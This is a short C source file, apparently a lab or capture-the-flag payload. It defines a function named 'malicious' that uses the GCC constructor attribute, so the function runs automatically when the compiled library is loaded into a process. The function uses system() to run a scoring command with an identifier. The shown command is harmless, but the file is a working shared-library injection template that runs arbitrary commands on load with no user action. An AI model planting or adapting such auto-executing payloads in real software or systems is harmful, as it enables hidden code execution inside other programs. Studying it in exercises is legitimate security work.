#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 04dd191f-bdd2-403f-9150-0dc027aac9b5");
}
